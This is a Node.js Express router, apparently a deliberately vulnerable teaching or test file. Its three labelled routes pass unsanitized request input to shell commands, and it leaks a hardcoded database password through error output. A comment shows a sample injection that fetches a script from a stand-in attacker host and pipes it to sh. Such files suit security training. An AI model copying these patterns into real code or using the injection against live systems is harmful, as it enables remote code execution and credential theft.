const express = require('express');
const router = express.Router();
const { exec, execSync } = require('child_process');
const secrets = require('../config/secrets');

/**
 * POST /api/system/dns-lookup
 * VULNERABILITY 1: OS Command Injection via shell string concatenation in exec()
 */
router.post('/dns-lookup', (req, res) => {
  const { domain, recordType = 'A' } = req.body;

  // Directly passes unsanitized `domain` and `recordType` to /bin/sh
  const cmd = `nslookup -type=${recordType} ${domain}`;
  exec(cmd, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: error.message, stderr });
    }
    res.json({ command: cmd, output: stdout });
  });
});

/**
 * POST /api/system/backup-db
 * VULNERABILITY 2: OS Command Injection & Hardcoded Password passed on CLI command line
 */
router.post('/backup-db', (req, res) => {
  const { tableName, outputFilename } = req.body;

  // Attacker can inject `; curl http://attacker.com/shell.sh | sh #` via outputFilename or tableName
  const backupCommand = `mysqldump -u root -p'${secrets.DB_MASTER_PASSWORD}' enterprise_prod_db ${tableName} > /tmp/backups/${outputFilename}.sql`;
  try {
    const result = execSync(backupCommand, { encoding: 'utf8' });
    res.json({
      status: 'backup_created',
      file: `/tmp/backups/${outputFilename}.sql`,
      output: result
    });
  } catch (err) {
    res.status(500).json({ error: err.message, cmd: backupCommand });
  }
});

/**
 * GET /api/system/logs
 * VULNERABILITY 3: Command Injection in grep filter & log path
 */
router.get('/logs', (req, res) => {
  const { grepPattern = 'ERROR', lines = '50' } = req.query;
  exec(`tail -n ${lines} /var/log/app.log | grep "${grepPattern}"`, (err, stdout, stderr) => {
    res.send(`<pre>${stdout || stderr}</pre>`);
  });
});

module.exports = router;
